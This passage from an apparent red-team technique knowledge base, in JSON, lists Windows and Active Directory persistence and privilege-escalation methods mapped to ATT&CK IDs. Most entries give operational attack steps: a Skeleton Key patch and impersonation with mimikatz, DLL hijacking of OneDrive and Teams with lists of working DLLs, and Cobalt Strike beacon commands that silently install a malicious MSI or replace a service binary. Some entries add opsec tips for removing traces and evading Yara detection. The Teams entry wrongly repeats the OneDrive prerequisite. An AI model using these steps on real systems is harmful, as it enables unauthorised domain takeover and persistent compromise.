        "id": "695c76eb-0b11-4cf8-be62-962324935ba9",
        "name": "Skeleton Key",
        "phase": "04. Persistence",
        "ttp": "S0007",
        "external": false,
        "description": "The Skeleton Key must be used on Domain Controllers where LSASS will be patched to allow any user to be authenticated with the password `mimikatz` (their real passwords still work too). The skeleton key cannot be removed unless the domain controller is rebooted and it can cause side effects such as replication issues.",
        "content": "# Skeleton Key\nThe Skeleton Key must be used on Domain Controllers where as LSASS will be patched to allow any user to be authenticated with the password `mimikatz` (their real passwords still work too).\n\n\u26d4 The skeleton key cannot be removed unless the domain controller is rebooted and it can cause side effects such as replication issues.\n\n## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [],
        "tools": [
            "Mimikatz"
        ],
        "steps": [
            {
                "id": "1ab6f13e-3979-41f0-8e84-b98210354c12",
                "name": "Check if Skeleton Key is active",
                "description": "Execute the Mimikatz command to check if the Skeleton Key patch is applied on the Domain Controller. This is done by running the command `mimikatz !misc::skeleton` and checking the output for indicators that the keys patch is OK.",
                "requirements": {
                    "tools": [
                        "Mimikatz"
                    ]
                },
                "results": [
                    "KDC data",
                    "keys patch OK"
                ]
            },
            {
                "id": "2d5f4148-1cd0-488a-8e6e-1122b008c3a4",
                "name": "Attempt to authenticate with Skeleton Key",
                "description": "Use Mimikatz to impersonate a user using the Skeleton Key password by executing the command `mimikatz make_token EDU\\Administrator mimikatz`. This tests if impersonation via the Skeleton Key is successful.",
                "requirements": {
                    "tools": [
                        "Mimikatz"
                    ]
                },
                "results": [
                    "Impersonated",
                    "Access Granted"
                ]
            },
            {
                "id": "e9250aa2-5e32-49d7-9f8d-3183cf6f414d",
                "name": "List shares on the domain controller",
                "description": "Use Mimikatz after impersonation to list shares on the Domain Controller. After successfully impersonating a user, run the command `ls \\\\dc-2\\c$` to check access to administrative shares.",
                "requirements": {
                    "tools": [
                        "Mimikatz"
                    ]
                },
                "results": [
                    "Shares Listed",
                    "Access to C$"
                ]
            }
        ]
    },
    {
        "id": "0a754708-8c08-4c64-ac2b-5f56b0835e41",
        "name": "Startup Folder",
        "phase": "04. Persistence",
        "ttp": "T1547.001",
        "external": false,
        "description": "Starting executables located in the start up folder",
        "content": "# Startup Folder\nApplications, files and shortcuts within a user's startup folder are launched automatically when they first log in.\n\n\n## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [],
        "tools": [
            "SharPersist"
        ],
        "steps": [
            {
                "id": "f8d7c894-e024-46f6-b8c5-bd3f2e93e94d",
                "name": "Create Startup Shortcut",
                "description": "Add a shortcut to the Startup folder to execute a specified application on user login. The shortcut will point to a PowerShell command encoded in Base64.",
                "requirements": {
                    "tool": "SharPersist"
                },
                "results": [
                    "STARTUP:FILENAME:UserEnvSetup.lnk"
                ]
            },
            {
                "id": "e24c9435-f11b-4a5f-b5d4-de66ea143ee7",
                "name": "Add Registry Key for Persistence",
                "description": "Create a new registry key to execute a specified application upon user login, utilizing the 'Run' key under HKCU. This involves modifying the registry to include a new entry pointing to the executable.",
                "requirements": {
                    "tool": "SharPersist"
                },
                "results": [
                    "REGKEY:HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater",
                    "EXECUTABLE:C:\\ProgramData\\Updater.exe"
                ]
            }
        ]
    },
    {
        "id": "0aad5932-3430-4426-b2ad-62d8f83cf5c2",
        "name": "XLL Template",
        "phase": "04. Persistence",
        "ttp": "T1137.006",
        "external": false,
        "description": "Dropping an XLL template to XLStart folder in order to gain persistence through launching Excel",
        "content": "# XLL Template\nXLL is an extension for Excel add-ins. In reality, XLL is just a regular PE-DLL file. The XLL file extension is associated with an icon very similar to other Excel-supported extensions.\nIf the XLL file is planted into the TrustCenter defined location (by default `C:\\Program Files\\Microsoft Office\\<Office1x>\\Xlstart` or `C:\\Documents and Settings\\<User_name>\\Application Data\\Microsoft\\Excel\\XLSTART`) the Add-In will automatically run on starting Excel.\nOne disadvantage of XLL files is that they can only be loaded by Excel with the correct bitness. For example, a 64-bit XLL can only be loaded by the 64-bit version of Excel.\n\n## Detection\nExcel-DNA has another attribute that may hinder coverage with Yara, likely unknown even to the malware authors. For some reason, many Excel-DNA samples have slightly more than 10,000 exported functions, most of them without any meaningful functionality. The Yara PE module export function parsing limit is only 8,192. Therefore, a Yara rule that targets a certain export name located at an index higher than 8192 will not match against the sample.\n\n## Tools\n########\n########",
        "category": "",
        "stealthy": true,
        "changes": [],
        "tools": [],
        "steps": [
            {
                "id": "a72f4741-58ed-45d9-8347-70e9e1bdd8e5",
                "name": "Create XLL file",
                "description": "Generate a malicious or custom XLL file that contains the payload to be executed when Excel starts.",
                "requirements": {},
                "results": [
                    "XLL:CREATED"
                ]
            },
            {
                "id": "4491ab40-a8e5-4383-915d-d0b4ce7c9654",
                "name": "Locate XLStart directory",
                "description": "Identify the appropriate XLStart directory based on the version of Microsoft Office installed, typically found at `C:\\Program Files\\Microsoft Office\\<Office1x>\\Xlstart` or `C:\\Users\\<User_name>\\AppData\\Roaming\\Microsoft\\Excel\\XLSTART`.",
                "requirements": {},
                "results": [
                    "PATH:XLSTART"
                ]
            },
            {
                "id": "27b6234f-a532-444e-a276-bfb63dcad1d5",
                "name": "Copy XLL to XLStart",
                "description": "Copy the created XLL file to the identified XLStart directory to ensure it will load when Excel is opened.",
                "requirements": {},
                "results": [
                    "FILE:COPIED_TO_XLSTART"
                ]
            },
            {
                "id": "5d166a12-c2f2-41ac-a2c5-d12aac4304cd",
                "name": "Check Trust Center settings",
                "description": "Verify the Trust Center settings in Excel to ensure that macros and add-ins are allowed to run, which is necessary for the XLL to execute.",
                "requirements": {},
                "results": [
                    "TRUSTCENTER:ALLOW_ADDINS"
                ]
            },
            {
                "id": "cc3c1f9e-e08b-4645-8e7e-7fd9b1e089bb",
                "name": "Launch Excel",
                "description": "Open Excel to confirm that the XLL add-in is automatically loaded from the XLStart folder and executes the payload.",
                "requirements": {},
                "results": [
                    "XLL:EXECUTED"
                ]
            },
            {
                "id": "62c2ac25-fc88-46de-9c65-6372e7d4f83c",
                "name": "Monitor loaded add-ins",
                "description": "Utilize Excel's add-in management settings to confirm that the XLL file is listed among the loaded add-ins after launching Excel.",
                "requirements": {},
                "results": [
                    "ADDIN:LOADED"
                ]
            }
        ]
    },
    {
        "id": "64d0f606-f49e-4473-a13a-042522f548e3",
        "name": "OneDrive",
        "phase": "04. Persistence",
        "ttp": "T1574.001",
        "external": false,
        "description": "Get Persistence via OneDrive DLL hijacking",
        "content": "# OneDrive\n## Pre requisits\nOneDrive needs to be installed into %appdata% and NOT program files in order to work.\n \n## Path\n> %localappdata%\\Microsoft\\OneDrive\\\n\n## Process\n* Install OneDrive from [here](https://hansbrender.com/all-onedrive-versions/)\n* Create your payload\n* Clone metadata from ColorAdapterClient.dll from C:\\Windows\\System32\\ onto your payload  \n* Create the file %localappdata%\\Microsoft\\OneDrive\\ColorAdapterClient.dll  \n\n\u2757 Use DLL proxying against crashing  \n\n| dll | working | not working |\n| --- | ------- | ----------- |\n| SspiCli.dll| 20H2 | |\n| iertutil.dll| 20H2 | |\n| ncrypt.dll| 20H2 | |\n| CRYPTBASE.DLL| 20H2 | |\n| CRYPTSP.dll| 20H2 | |\n| profapi.dll| 20H2 | |\n| OneDriveTelemetryExperimental.dll| 20H2 | |\n| FileSyncTelemetryExtensions.dll| 20H2 | |\n| version.dll| 20H2 | 21H1 |\n\n\n## Tools\n########\n########",
        "category": "DLL Hijack",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": [
            {
                "id": "f8f92b94-8d9d-4f8b-a3b6-85422fdcd510",
                "name": "Install OneDrive",
                "description": "Download and install OneDrive to the local AppData directory to ensure it can be hijacked.",
                "requirements": {
                    "tool": "Web browser"
                },
                "results": [
                    "ONE_DRIVE:INSTALLED"
                ]
            },
            {
                "id": "b969a621-a4b1-49e8-84fa-ffbdb64b1b8a",
                "name": "Create Payload",
                "description": "Develop a malicious DLL payload that mimics the behavior of ColorAdapterClient.dll.",
                "requirements": {
                    "tool": "Compiler"
                },
                "results": [
                    "PAYLOAD:CREATED"
                ]
            },
            {
                "id": "6ec2b633-0ab0-4bb7-ab86-c5c35f643f31",
                "name": "Clone DLL Metadata",
                "description": "Copy the metadata from C:\\Windows\\System32\\ColorAdapterClient.dll to the malicious DLL payload.",
                "requirements": {
                    "tool": "Hex editor or binary analysis tool"
                },
                "results": [
                    "DLL:METADATA_CLONED"
                ]
            },
            {
                "id": "bd09fc86-e308-487a-96bc-b517b5ed3694",
                "name": "Place Malicious DLL in OneDrive",
                "description": "Create the file %localappdata%\\Microsoft\\OneDrive\\ColorAdapterClient.dll to replace the original with the malicious version.",
                "requirements": {},
                "results": [
                    "DLL:PLACED",
                    "PERSISTENCE:ESTABLISHED"
                ]
            },
            {
                "id": "63563577-a02e-4be4-9b64-fdcf929415f6",
                "name": "Test DLL Proxying",
                "description": "Perform tests with different DLLs to ensure the hijacking works without crashing OneDrive.",
                "requirements": {},
                "results": [
                    "DLL:PROXYING_SUCCESSFUL",
                    "DLL:PROXYING_FAILED"
                ]
            }
        ]
    },
    {
        "id": "d9d27087-1f07-4982-a4c5-df801d9c055e",
        "name": "Search Order Hijacking",
        "phase": "04. Persistence",
        "ttp": "T1574.001",
        "external": false,
        "description": "Side-loading takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other.",
        "content": "# Search Order Hijacking\n\nThere are many ways an adversary can hijack DLL loads.\n* Plant malicious DLLs in a directory that will be searched before the location of a legitimate library, causing Windows to load the malicious DLL. Often this location is the current working directory of the program.\n* Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL.\n* Attackers can also directly modify the search order via DLL redirection, which after being enabled (in the Registry and creation of a redirection file) may cause a program to load a different DLL.\n* Priv Esc: If a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL will also be executed at the higher level. To reduce suspicion configure the malicious DLLs to also load the legitimate DLLs they were meant to impersonate.\n\n## Safe DLL Search Mode\nDisallow loading of remote DLLs. This is included by default in Windows Server 2012+ and is available by patch for XP+ and Server 2003+.\nEnable Safe DLL Search Mode to force search for system DLLs in directories with greater restrictions (e.g. %SYSTEMROOT%)to be used before local directory DLLs (e.g. a user's home directory).\n\nGPO  \nThe Safe DLL Search Mode can be enabled via Group Policy at Computer Configuration > Policies > Administrative Templates > MSS (Legacy): MSS: (SafeDllSearchMode) > Enable Safe DLL search mode.\n\nRegistry  \nThe associated Windows Registry key for this is located at:\n`HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\SafeDLLSearchMode`\n\n\n## Tools\n########\n########",
        "category": "DLL Hijack",
        "stealthy": false,
        "changes": [
            "\n## [[API Monitor]]\nDLL Search Order Hijacking"
        ],
        "tools": [
            "API Monitor"
        ],
        "steps": [
            {
                "id": "fa2b6ed1-bbf8-473b-8aca-7161ff921c0d",
                "name": "Verify Safe DLL Search Mode",
                "description": "Check if Safe DLL Search Mode is enabled in the Windows Registry to prevent DLL search order hijacking. The registry key path to verify is `HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\SafeDLLSearchMode`, and it should be set to 1.",
                "requirements": {},
                "results": [
                    "DLL_SEARCH_MODE:ENABLED"
                ]
            },
            {
                "id": "24d8e40d-54a0-4ddb-b645-79931cd65363",
                "name": "Check Current Working Directory",
                "description": "Identify the current working directory of a vulnerable application to find potential locations for DLL hijacking. Use the tool to inspect the directory from which the application is executing.",
                "requirements": {},
                "results": [
                    "CWD:BLACKLISTED_PATH"
                ]
            },
            {
                "id": "88b9805b-5fff-4c9c-8406-75f1a6277764",
                "name": "Monitor Application for DLL Loads",
                "description": "Utilize API Monitor to intercept and log all DLL loads made by a target application, looking for instances where non-legitimate DLLs are being loaded.",
                "requirements": {
                    "tool": "API Monitor"
                },
                "results": [
                    "DLL_LOAD:SUSPECT"
                ]
            },
            {
                "id": "0b7271b2-e1eb-479b-9f58-70acfb8a0f01",
                "name": "Test for DLL Redirection",
                "description": "Create a DLL redirection file in the same directory as a target executable, and ensure the specified DLL is loaded instead of the legitimate one. Confirm via application logs that the redirection was successful.",
                "requirements": {},
                "results": [
                    "DLL_REDIRECT:SUCCESS"
                ]
            },
            {
                "id": "e94d3e0e-4b05-41a4-b69e-82f2e69fc5a3",
                "name": "Inject Malicious DLL",
                "description": "Drop a malicious DLL in the application\u2019s working directory or a location prioritized by the DLL search order. Then execute the application and verify through logs or monitoring tools that the malicious DLL was loaded.",
                "requirements": {},
                "results": [
                    "MALICIOUS_DLL:LOADED"
                ]
            }
        ]
    },
    {
        "id": "c3e47c92-8488-4ba0-b66c-547241fbbdf9",
        "name": "Teams",
        "phase": "04. Persistence",
        "ttp": "T1574.001",
        "external": false,
        "description": "Get Persistence via Teams DLL hijacking",
        "content": "# Teams\n## Pre requisits\nOneDrive needs to be installed into %appdata% and NOT program files in order to work.\n\n## Path\n> %localappdata%\\Microsoft\\Teams\\current\\  \n\n\n\u2757 Use DLL proxying against crashing  \n\n| dll | working | not working |\n| --- | ------- | ----------- |\n| ncrypt.dll | even without proxying |  |\n| CRYPTBASE.DLL |  |  |\n| CRYPTSP.dll |  |  |\n| crypt32.dll |  |  |\n| MSASN1.dll |  |  |\n| wintrust.dll |  |  |\n| winnlsres.dll |  |  | \n| MSVCP140_CLR0400.dll |  |  |\n| version.dll | 21H1-19043 |  |\n\n## Tools\n########\n########",
        "category": "DLL Hijack",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": [
            {
                "id": "dabd7aa1-3c7c-4c41-a6db-44aa2644502f",
                "name": "Verify OneDrive Installation Path",
                "description": "Check if OneDrive is installed in the %appdata% directory instead of Program Files, which is a requirement for the subsequent steps.",
                "requirements": {},
                "results": [
                    "ONESDRIVE:INSTALLED_IN_APPDATA"
                ]
            },
            {
                "id": "886e6089-9f3c-414a-a06f-34c03880340f",
                "name": "Locate Teams Directory",
                "description": "Navigate to the Microsoft Teams current directory under %localappdata% to gather needed DLLs for hijacking.",
                "requirements": {},
                "results": [
                    "TEAMS:DIRECTORY_FOUND",
                    "PATH:%localappdata%\\Microsoft\\Teams\\current\\"
                ]
            },
            {
                "id": "0b85250f-29f4-4537-be09-cd5743ff8704",
                "name": "List DLLs for Proxying",
                "description": "Identify DLL files present in the Teams directory to assess which can be used for DLL proxying.",
                "requirements": {},
                "results": [
                    "DLLS:LISTED"
                ]
            },
            {
                "id": "b029e7be-bc62-4ac1-a644-eee18116b89d",
                "name": "Test DLL Proxying",
                "description": "Attempt DLL proxying using identified DLLs by replacing or creating DLLs in the Teams directory that may crash during loading.",
                "requirements": {},
                "results": [
                    "DLL:PROXIED_SUCCESS",
                    "CRASH:CONFIRMED_OR_NOT"
                ]
            },
            {
                "id": "0e3008c2-58c8-4c3e-8b59-bb42f832bba0",
                "name": "Evaluate DLL Functionality",
                "description": "Evaluate which DLLs are functional or non-functional after proxying to determine the success of the persistence mechanism.",
                "requirements": {},
                "results": [
                    "DLL:WORKING",
                    "DLL:NOT_WORKING"
                ]
            }
        ]
    },
    {
        "id": "ef68c56d-83f6-4f2a-9d7a-65cf88bca30b",
        "name": "Always Install Elevated",
        "phase": "05. Privilege Escalation",
        "ttp": "T1548",
        "external": false,
        "description": "This registry value enables a user to install applications with access to higher level folders/registry keys.",
        "content": "# Always Install Elevated\nThis policy allows standard users to install applications requiring higher permissions as the user has. This is equivalent to granting full administrative rights.\n\nVulnerability can be identified via [[Tools/SharpUp]]\n\n## Exploit\nCreate a MSI installer containing the payload that will be installed and executed with SYSTEM privileges.\n\n-   Generate a new TCP payload and save it to `C:\\Payloads\\beacon-tcp.exe`.\n-   Open **Visual Studio**, select **Create a new project** and enter **installer**. Select the **Setup Wizard** project and give the project a name, like **InstallBeacon**.\n-   Use a random location like `C:\\Payloads`, then select **place in the same directory**, and click **Create**.\n-   When prompted with the choice to include files click **Add** and select the payload (beacon-tcp.exe) and click **Finish**.\n-   Highlight the **InstallBeacon** project and change the **TargetPlatform** based on the target architecture.\n-   Right-click the project and select **View > Custom Actions**.\n-   Right-click **Install** and select **Add Custom Action**.\n-   For direct execution, double-click on **Application Folder**, select your **beacon-tcp.exe** file and click **OK**.\n-   If you have selected x64 before make sure to change **Run64Bit** to **True** in the **Custom Action Properties** option.\n\nNow build the project, which should produce an MSI at `C:\\Payloads\\InstallBeacon\\Debug\\InstallBeacon.msi`.\n\n\n#opsec:\n- if installed, it will appear as an installed program.\n- clone file metadata like  **Author** or **Manufacturer**.\n\n\n``````beacon\nbeacon> cd C:\\Temp\nbeacon> upload C:\\Payloads\\InstallBeacon\\Debug\\InstallBeacon.msi\nbeacon> run msiexec /i InstallBeacon.msi /q /n\nbeacon> connect localhost 4444\n[+] established link to child beacon: 192.168.1.253\n``````\n\n#OPSEC remove the MSI afterwards, you can use `msiexec /n /q /uninstall InstallBeacon.msi` for removing the file.\n\n## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": [
            {
                "id": "b038c29a-6e0a-4f61-b9ed-6c625b0df02f",
                "name": "Check Registry for AlwaysInstallElevated",
                "description": "Verify if the AlwaysInstallElevated registry setting exists for the current user in HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Installer. This enables standard users to install applications that require elevated permissions.",
                "requirements": {},
                "results": [
                    "REG:ALWAYSELEVATED:TRUE"
                ]
            },
            {
                "id": "c73d0a67-1446-43e7-81cd-f1cb5e069558",
                "name": "Generate TCP Payload",
                "description": "Create a TCP payload with the necessary command and save it to C:\\Payloads\\beacon-tcp.exe.",
                "requirements": {
                    "Tool": "Payload generation tool (e.g., msfvenom)"
                },
                "results": [
                    "PAYLOAD:CREATED"
                ]
            },
            {
                "id": "5c6b469f-d869-423f-a1d2-76b098d99017",
                "name": "Create MSI Installer Project",
                "description": "Open Visual Studio and create a new Setup Wizard project named 'InstallBeacon' that includes the payload located at C:\\Payloads.",
                "requirements": {
                    "Tool": "Visual Studio"
                },
                "results": [
                    "MSI:PROJECT_CREATED"
                ]
            },
            {
                "id": "a2c94ed6-e3d3-4dc9-9301-12829bd6f0e7",
                "name": "Build MSI Installer",
                "description": "Build the Setup Wizard project to generate the MSI installer at C:\\Payloads\\InstallBeacon\\Debug\\InstallBeacon.msi.",
                "requirements": {
                    "Tool": "Visual Studio"
                },
                "results": [
                    "MSI:BUILT"
                ]
            },
            {
                "id": "cd511c25-ecde-4938-b9e3-c4a77f9b18ab",
                "name": "Upload MSI Installer",
                "description": "Use the beacon console to change directory to C:\\Temp, then upload the InstallBeacon.msi from C:\\Payloads\\InstallBeacon\\Debug.",
                "requirements": {
                    "Tool": "Beacon console"
                },
                "results": [
                    "MSI:UPLOADED"
                ]
            },
            {
                "id": "2a3ebbe6-75f8-4a58-a8b5-e9e4c948cf69",
                "name": "Execute MSI Installer",
                "description": "Run the MSI installer using msiexec with silent installation parameters to install the payload.",
                "requirements": {
                    "Tool": "Beacon console"
                },
                "results": [
                    "EXECUTION:SUCCESS"
                ]
            },
            {
                "id": "b3d97bc1-1b7d-4d1f-a373-0e6c7237a5f2",
                "name": "Connect to Payload Listener",
                "description": "After installing the payload, connect back to the listener on localhost:4444 to establish the remote session.",
                "requirements": {},
                "results": [
                    "CONNECT:SUCCESS"
                ]
            },
            {
                "id": "8c6b0563-431f-4931-b7dc-8f7a756c2cb4",
                "name": "Uninstall MSI Installer",
                "description": "After successful connection, use msiexec to silently uninstall the MSI installer to remove traces from the system.",
                "requirements": {
                    "Tool": "Command prompt"
                },
                "results": [
                    "MSI:UNINSTALLED"
                ]
            }
        ]
    },
    {
        "id": "9b9fc55f-9ec4-4cd6-b0a3-5fcfe6a39134",
        "name": "Change Domain Objects",
        "phase": "05. Privilege Escalation",
        "ttp": "T1484",
        "external": false,
        "description": "NoDescription",
        "content": "## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [],
        "tools": [
            "PowerView"
        ],
        "steps": [
            {
                "id": "eec94e18-1a06-41a9-91a3-1178cddc7105",
                "name": "Clear Service Principal Name",
                "description": "This step clears the Service Principal Name (SPN) for a specified domain user. It is useful for resetting configurations that may expose users to security risks.",
                "requirements": {},
                "results": [
                    "SPN:CLEARED"
                ]
            },
            {
                "id": "c5b1338d-df1d-4d35-8324-3f2cbb6de2c2",
                "name": "Add DONT_REQ_PREAUTH Flag",
                "description": "This step modifies the User Account Control (UAC) attributes of a domain user to add the 'DONT_REQ_PREAUTH' flag. This allows the user to authenticate without requiring pre-authentication, which is a common privilege escalation technique.",
                "requirements": {},
                "results": [
                    "UAC:MODIFIED",
                    "DONT_REQ_PREAUTH:TRUE"
                ]
            },
            {
                "id": "6a655c7d-f75c-415d-a8f2-f8022cd1c532",
                "name": "Grant DCSync Rights",
                "description": "This step grants DCSync permissions to a specified principal on the domain. DCSync allows an account to impersonate the domain controller and request account password data.",
                "requirements": {},
                "results": [
                    "DCSYNC:GRANTED"
                ]
            },
            {
                "id": "9f1d97e4-a1b9-466c-ad26-d4827b766652",
                "name": "Modify AdminSDHolder DACL",
                "description": "This step modifies the Discretionary Access Control List (DACL) on the AdminSDHolder object in Active Directory, which allows for inherited permissions to rogue groups that can replicate the changes across other privileged accounts.",
                "requirements": {},
                "results": [
                    "DACL:MODIFIED",
                    "INHERITANCE:ENABLED"
                ]
            }
        ]
    },
    {
        "id": "88fd66ea-35bd-48b2-a8a0-229a7c5fa173",
        "name": "UAC Bypasses",
        "phase": "05. Privilege Escalation",
        "ttp": "T1548.002",
        "external": false,
        "description": "UAC bypass to elevate from medium into a high integrity process",
        "content": "# UAC Bypasses\nThis technique enables and attacker from **Medium** to **High Integrity** without prompting for consent.\n\nBy default, applications will run in **Medium** Integrity context. Even if local administrators launch the Command Prompt \"normally\" it is not possible to execute privileged functions.\n\nThe default setting is **Prompt for consent for non-Windows binaries**, but you can configure them to the following states, top to bottom reducing security:\n* Prompt for credentials\n* Prompt for consent\n* Prompt for consent for non-Windows binaries \n* Elevate without prompting.\n\n[[Seatbelt]] can be used to query the configuration applied to a machine.\nCobalt Strike has some [[UAC-Bypass]] included.\n\n\n## Tools\n########\n########",
        "category": "",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": [
            {
                "id": "d6aaf0e5-3e43-4964-817e-33ed1c1cf65b",
                "name": "Check UAC Configuration",
                "description": "Query the current User Account Control (UAC) settings from the registry to determine if UAC is configured to prompt for consent or nothing at all. The relevant registry path is `HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System` and the key `ConsentPromptBehaviorUser` will indicate the current setting.",
                "requirements": {},
                "results": [
                    "UAC:PROMPT",
                    "UAC:ELEVATE"
                ]
            },
            {
                "id": "f8a2a8c9-a90d-4c37-93c9-c6768252a4cf",
                "name": "Modify UAC Settings",
                "description": "Change the UAC setting to 'Elevate without prompting' for testing purposes. This can be done by updating the registry key located at `HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System` and setting `ConsentPromptBehaviorUser` to `0`.",
                "requirements": {},
                "results": [
                    "UAC:MODIFIED",
                    "UAC:ELEVATE_NO_PROMPT"
                ]
            },
            {
                "id": "f3c62257-0c4c-4695-8a7c-4d164d6a9008",
                "name": "Use Seatbelt to Query UAC Status",
                "description": "Utilize the Seatbelt tool to query detailed UAC configuration settings. Execute the command `Seatbelt.exe --uac` to gather information regarding the current UAC configuration.",
                "requirements": {
                    "tool": "Seatbelt"
                },
                "results": [
                    "UAC:CONFIG_FOUND",
                    "UAC:RUN_LEVEL"
                ]
            },
            {
                "id": "d6191d72-fdd5-4613-ae3c-1a83d2ff5734",
                "name": "Attempt to Launch Elevated Process",
                "description": "Try to run an application that requires higher privileges without prompting. This can be done via the command line or scripts, using commands like `cmd.exe`, specifying an executable that would typically require elevation. This would test if the UAC modification was successful.",
                "requirements": {},
                "results": [
                    "ELEVATION:SUCCESS",
                    "ELEVATION:FAILED"
                ]
            }
        ]
    },
    {
        "id": "33296a49-ec03-45c0-94c5-27b68a700550",
        "name": "Unquoted Service Path",
        "phase": "05. Privilege Escalation",
        "ttp": "T1574.009",
        "external": false,
        "description": "Hijacking the search order hierarchy of an application's DLL.",
        "content": "# Unquoted Service Paths\nAn unquoted service path is where the path to the [[Windows Services]] binary is not wrapped in quotes and contains spaces.\n\n## Conditions to exploit\n1. Vuln-Service has spaces in the path and is also not quoted\n2. Check permissions to write into the paths based on the search order\n\t1.  `C:\\Program.exe`\n\t2.  `C:\\Program Files\\Vuln.exe`\n\t3.  `C:\\Program Files\\Vuln Service\\Service.exe`\n3. Generate malicious service binary. We can do this in Cobalt Strike via **Attacks > Packages > Windows Executable (S)** and selecting the **Service Binary** output type.\n```````beacon\ncd C:\\Program Files\\Vuln Service\nupload C:\\Payloads\\beacon-tcp-svc.exe\nmv beacon-tcp-svc.exe Service.exe\nrun sc stop Vuln-Service\nrun sc start Vuln-Service\n```````\n\n4. Check beacon and connect (if TCP listener is used)\n``````\nrun netstat -anp tcp\n[...snip...]\nTCP    127.0.0.1:4444         0.0.0.0:0              LISTENING\n\nconnect localhost 4444\n[+] established link to child beacon: 10.10.17.231\n``````\n\n\n## Tools\n########\n########",
        "category": "Services",
        "stealthy": false,
        "changes": [],
        "tools": [
            "PowerShell",
            "wmic"
        ],
        "steps": [
            {
                "id": "3ea0c8c5-60dc-4af0-90a2-c7a5ca7dc1c0",
                "name": "List Services and Paths",
                "description": "Use WMIC to list all services along with their executable paths to identify unquoted service paths.",
                "requirements": {},
                "results": [
                    "SERVICE:NAME",
                    "SERVICE:PATHNAME"
                ]
            },
            {
                "id": "c543b004-d42c-4d73-97a6-bb779c2840cb",
                "name": "Check Unquoted Paths",
                "description": "Identify services with unquoted paths that may contain spaces. Look for any service paths in the output from the previous step that are not enclosed in quotes.",
                "requirements": {},
                "results": [
                    "UNQUOTED:SERVICE_PATH"
                ]
            },
            {
                "id": "12d6dcb7-eml3-4f03-8e75-1483c77324a8",
                "name": "Get ACL of the Service Directory",
                "description": "Retrieve the Access Control List (ACL) of the service directory to determine if the current user has write permissions on the path where the service executables are located.",
                "requirements": {
                    "tool": "PowerShell"
                },
                "results": [
                    "ACL:PERMISSIONS"
                ]
            },
            {
                "id": "65de4c83-10d2-4bfa-bcf4-2ba4bfcb5850",
                "name": "Generate Malicious Service Binary",
                "description": "Create a malicious service binary that will hijack the unquoted service execution. This could be done using Cobalt Strike or similar tools to format the binary properly.",
                "requirements": {
                    "tool": "Cobalt Strike"
                },
                "results": [
                    "MALICIOUS:EXECUTABLE"
                ]
            },
            {
                "id": "b81c8f4a-20c1-4a78-8def-4780b192c0a3",
                "name": "Replace Service Executable",
                "description": "Move the generated malicious service executable to the service's directory, renaming it to match the service's executable name, which exploits the unquoted path vulnerability.",
                "requirements": {},
                "results": [
                    "REPLACEMENT:SUCCESS"
                ]
            },
            {
                "id": "a76cec70-bbe5-49be-a568-67c1c2c8c78a",
                "name": "Restart the Vulnerable Service",
                "description": "Stop and start the service with the unquoted path to execute the malicious binary.",
                "requirements": {},
                "results": [
                    "SERVICE:RESTARTED",
                    "MALICIOUS:EXECUTION"
                ]
            },
            {
                "id": "7281b565-df45-48cb-b9f8-25c623f2a576",
                "name": "Check Network Connections",
                "description": "Use netstat to verify that the malicious service binary has established a connection as a callback for remote control.",
                "requirements": {
                    "tool": "netstat"
                },
                "results": [
                    "NETSTAT:LISTENING",
                    "CONNECT:SUCCESS"
                ]
            }
        ]
    },
    {
        "id": "7b2080cb-0a1f-48c2-a108-04022daf3c09",
        "name": "Weak Service Permissions",
        "phase": "05. Privilege Escalation",
        "ttp": "T1574.010",
        "external": false,
        "description": "Weak service permissions can be abused in order to change the binPath",
        "content": "# Weak Service Permissions\nIdentify weak [[Windows Services]] permissions via [[Tools/SharpUp]].",
        "category": "Services",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": [
            {
                "id": "c3b79772-1c5b-4bc0-83bb-d5d58b703083",
                "name": "Identify Service ACLs",
                "description": "Use the Get-ServiceAcl.ps1 script to identify the access control entries on the specified vulnerable service, checking for weak permissions assigned to 'Authenticated Users'. Code example: `Get-ServiceAcl -Name VulnService | select -expandproperty Access`.",
                "requirements": {
                    "script": "C:\\Tools\\Get-ServiceAcl.ps1"
                },
                "results": [
                    "ACCESS:AUTH_USERS_CHANGE_CONFIG",
                    "ACCESS:AUTH_USERS_START",
                    "ACCESS:AUTH_USERS_STOP"
                ]
            },
            {
                "id": "8125d0ab-3bfb-4f97-bb75-128da0b523b8",
                "name": "Display Service Configuration",
                "description": "Display the current configuration of the service to review its binary path and status. Code example: `sc qc VulnService`.",
                "requirements": {},
                "results": [
                    "CONFIG:VULN_SERVICE_BINPATH"
                ]
            },
            {
                "id": "e3707def-a66b-4d0c-a2f3-620b7f2517b1",
                "name": "Change Service BinPath",
                "description": "Change the binary path of the vulnerable service to a malicious executable. Ensure you have sufficient permissions. Code example: `sc config VulnService binPath= C:\\Temp\\test-service.exe`.",
                "requirements": {},
                "results": [
                    "MODIFY:BINSERVICE_BINPATH"
                ]
            },
            {
                "id": "7e0dca31-8cf3-4d06-a94f-685d62bda7f4",
                "name": "Query Service Status",
                "description": "Check the status of the modified service after changing the binary path. Use the command: `sc query VulnService`.",
                "requirements": {},
                "results": [
                    "STATUS:VULN_SERVICE_RUNNING",
                    "STATUS:VULN_SERVICE_STOPPED"
                ]
            },
            {
                "id": "b48ecc93-08b2-4ffd-b6dc-67f35756df2e",
                "name": "Stop Vulnerable Service",
                "description": "Stop the vulnerable service to avoid any conflict while uploading a malicious service executable. Code example: `sc stop VulnService`.",
                "requirements": {},
                "results": [
                    "ACTION:VULN_SERVICE_STOPPED"
                ]
            },
            {
